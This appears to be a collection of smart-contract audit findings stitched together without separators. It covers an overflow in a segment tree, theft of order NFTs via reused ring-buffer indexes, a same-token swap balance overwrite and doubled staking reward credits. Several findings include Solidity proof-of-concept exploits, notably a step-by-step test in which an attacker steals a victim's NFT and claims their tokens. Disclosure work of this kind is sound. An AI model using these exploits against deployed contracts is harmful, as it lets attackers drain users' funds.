description:
SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core).
However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe:
```solidity
function total(Core storage core) internal view returns (uint64) {
    return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C)
        + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C);
}
```
The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users.
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "forge-std/StdJson.sol";
import "../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol";
contract SegmentedSegmentTree464Test is Test {
    using stdJson for string;
    uint32 private constant _MAX_ORDER = 2**15;
    SegmentedSegmentTree464Wrapper testWrapper;
    function setUp() public {
        testWrapper = new SegmentedSegmentTree464Wrapper();
    }
    function testTotalOverflow() public {
        uint64 half64 = type(uint64).max / 2 + 1;
        testWrapper.update(0, half64);
        // map to the right node of layer 0, group 0
        testWrapper.update(_MAX_ORDER / 2 - 1, half64);
        assertEq(testWrapper.total(), 0);
    }
}
```

The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function.
```solidity
function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) {
    return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M];
}
CloberOrderBook(market).getOrder(decodeId(tokenId)).owner
```
Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens.
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol";
import "../../../../contracts/mocks/MockQuoteToken.sol";
import "../../../../contracts/mocks/MockBaseToken.sol";
import "../../../../contracts/mocks/MockOrderBook.sol";
import "../../../../contracts/markets/VolatileMarket.sol";
import "../../../../contracts/OrderNFT.sol";
import "../utils/MockingFactoryTest.sol";
import "./Constants.sol";
contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest {
    struct Return {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 amountOut;
        uint256 refundBounty;
    }
    struct Vars {
        uint256 inputAmount;
        uint256 outputAmount;
        uint256 beforePayerQuoteBalance;
        uint256 beforePayerBaseBalance;
        uint256 beforeTakerQuoteBalance;
        uint256 beforeOrderBookEthBalance;
    }
    MockQuoteToken quoteToken;
    MockBaseToken baseToken;
    MockOrderBook orderBook;
    OrderNFT orderToken;
    function setUp() public {
        quoteToken = new MockQuoteToken();
        baseToken = new MockBaseToken();
    }
    function cloberMarketSwapCallback(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOut,
        bytes calldata data
    ) external payable {
        if (data.length != 0) {
            Return memory expectedReturn = abi.decode(data, (Return));
            assertEq(tokenIn, expectedReturn.tokenIn, "ERROR_TOKEN_IN");
            assertEq(tokenOut, expectedReturn.tokenOut, "ERROR_TOKEN_OUT");
            assertEq(amountIn, expectedReturn.amountIn, "ERROR_AMOUNT_IN");
            assertEq(amountOut, expectedReturn.amountOut, "ERROR_AMOUNT_OUT");
            assertEq(msg.value, expectedReturn.refundBounty, "ERROR_REFUND_BOUNTY");
        }
        IERC20(tokenIn).transfer(msg.sender, amountIn);
    }
    function _createOrderBook(int24 makerFee, uint24 takerFee) private {
        orderToken = new OrderNFT();
        orderBook = new MockOrderBook(
            address(orderToken),
            address(quoteToken),
            address(baseToken),
            1,
            10**4,
            makerFee,
            takerFee,
            address(this)
        );
        orderToken.init("", "", address(orderBook), address(this));
        uint256 _quotePrecision = 10**quoteToken.decimals();
        quoteToken.mint(address(this), 1000000000 * _quotePrecision);
        quoteToken.approve(address(orderBook), type(uint256).max);
        uint256 _basePrecision = 10**baseToken.decimals();
        baseToken.mint(address(this), 1000000000 * _basePrecision);
        baseToken.approve(address(orderBook), type(uint256).max);
    }
    function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) {
        return (isBid ? 1 : 0) + (postOnly ? 2 : 0);
    }
    uint256 private constant _MAX_ORDER = 2**15; // 32768
    uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768
    function testExploit2() public {
        _createOrderBook(0, 0);
        address attacker = address(0x1337);
        address attacker2 = address(0x1338);
        address victim = address(0xbabe);
        // Step 1. Attacker creates an ASK limit order and receives NFT
        uint16 priceIndex = 100;
        uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
            user: attacker,
            priceIndex: priceIndex,
            rawAmount: 0,
            baseAmount: 1e18,
            options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
            data: new bytes(0)
        });
        // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds
        CloberOrderBook.OrderKey memory orderKey =
            CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex});
        uint256 currentTokenId = orderToken.encodeId(orderKey);
        orderKey.orderIndex += _MAX_ORDER;
        uint256 futureTokenId = orderToken.encodeId(orderKey);
        // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id
        vm.startPrank(attacker);
        orderToken.approve(attacker2, futureTokenId);
        CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1);
        orderKeys[0] = orderKey;
        orderKeys[0].orderIndex = orderIndex; // restore original orderIndex
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0
        uint256 victimOrderSize = 1e18;
        for(uint256 i = 0; i < _MAX_ORDER; i++) {
            orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
                user: i < _MAX_ORDER - 1 ? attacker : victim,
                priceIndex: priceIndex,
                rawAmount: 0,
                baseAmount: victimOrderSize,
                options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
                data: new bytes(0)
            });
        }
        assertEq(orderToken.ownerOf(futureTokenId), victim);
        // Step 5. Attacker steals the NFT and can cancel to receive the tokens
        vm.startPrank(attacker2);
        orderToken.transferFrom(victim, attacker, futureTokenId);
        vm.stopPrank();
        assertEq(orderToken.ownerOf(futureTokenId), attacker);
        uint256 baseBalanceBefore = baseToken.balanceOf(attacker);
        vm.startPrank(attacker);
        orderKeys[0].orderIndex = orderIndex + _MAX_ORDER;
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize);
    }
}
```

The StableSwapFacet has the function swapExactOut() where a user could supply the same assetIn address as assetOut, which means the TokenIndexes for tokenIndexFrom and tokenIndexTo function swapOut() are the same.
In function swapOut() a temporay array is used to store balances.
When updating such balances, first self.balances[tokenIndexFrom] is updated and then self.balances[tokenIndexTo] is updated afterwards.
However when tokenIndexFrom == tokenIndexTo the second update overwrites the first update, causing token balances to be arbitrarily lowered. This also skews the exchange rates, allowing for swaps where value can be extracted.
Note: the protection against this problem is location in function getY(). However, this function is not called from swapOut().
Note: the same issue exists in swapInternalOut(), which is called from swapFromLocalAssetIfNeededForExactOut() via _swapAssetOut(). However, via this route it is not possible to specify arbitrary token indexes. Therefore, there isn’t an immediate risk here.
```solidity
contract StableSwapFacet is BaseConnextFacet {
    ...
    function swapExactOut(... ,address assetIn, address assetOut, ... ) ... {
        return
            s.swapStorages[canonicalId].swapOut(
                getSwapTokenIndex(canonicalId, assetIn),
                // assetIn could be same as assetOut
                getSwapTokenIndex(canonicalId, assetOut),
                amountOut,
                maxAmountIn
            );
    }
    ...
}
```
```solidity
library SwapUtils {
    function swapOut(...,
        uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... {
        ...
        uint256[] memory balances = self.balances;
        ...
        self.balances[tokenIndexFrom] = balances[tokenIndexFrom].add(dx).sub(dxAdminFee);
        self.balances[tokenIndexTo] = balances[tokenIndexTo].sub(dy); // overwrites previous update if From==To
        ...
    }

    function getY(..., uint8 tokenIndexFrom, uint8 tokenIndexTo, ... ) ... {
        ...
        require(tokenIndexFrom != tokenIndexTo, "compare token to itself"); // here is the protection
        ...
    }
}
```
Below is a proof of concept which shows that the balances of index 3 can be arbitrarily reduced.
```solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.14;
import "hardhat/console.sol";
contract test {
    uint[] balances = new uint[](10);
    function swap(uint8 tokenIndexFrom,uint8 tokenIndexTo,uint dx) public {
        uint dy=dx; // simplified
        uint256[] memory mbalances = balances;
        balances[tokenIndexFrom] = mbalances[tokenIndexFrom] + dx;
        balances[tokenIndexTo] = mbalances[tokenIndexTo] - dy;
    }
    constructor() {
        balances[3] = 100;
        swap(3,3,10);
        console.log(balances[3]); // 90
    }
}
```

The current implementation of _claimToCredit() function in StakedCSX.sol contract has a logical error in it:
```solidity
(,,uint256 rewardWETH) = rewardOf(_to);
if (rewardWETH > 0) {
    credit[address(TOKEN_WETH)][_to] += rewardWETH;
}
(uint256 rewardUSDC ,,) = rewardOf(_to);
if(rewardUSDC > 0) {
    credit[address(TOKEN_USDC)][_to] += rewardUSDC;
}
(,uint256 rewardUSDT ,) = rewardOf(_to);
if(rewardUSDT > 0) {
    credit[address(TOKEN_USDT)][_to] += rewardUSDT;
}
```
As can be seen, an addition assignment operator is being used on all of the updates to the credit mapping. This is wrong since the current value of the respective credit for each asset is already being added to the reward variables that are retrieved through the StakedCSX::rewardOf() function. This means that on each call to StakedCSX::_claimToCredit(), the credit values are going to get doubled.
```solidity
if(credit[address(TOKEN_WETH)][_account] > 0) {
    wethAmount += credit[address(TOKEN_WETH)][_account];
}
if(credit[address(TOKEN_USDC)][_account] > 0) {
    usdcAmount += credit[address(TOKEN_USDC)][_account];
}
if(credit[address(TOKEN_USDT)][_account] > 0) {
    usdtAmount += credit[address(TOKEN_USDT)][_account];
}
```
And because StakedCSX::_claimToCredit() is being called in the StakedCSX::_beforeTokenTransfer() callback, this error can easily be abused to infinitely double the reward credits of a given user by simply making zero value StakedCSX token transfers.

Malicious stakes can easily drain all of the staking rewards from the StakedCSX.sol contract, making the contract insolvent and leaving other stakes empty-handed.

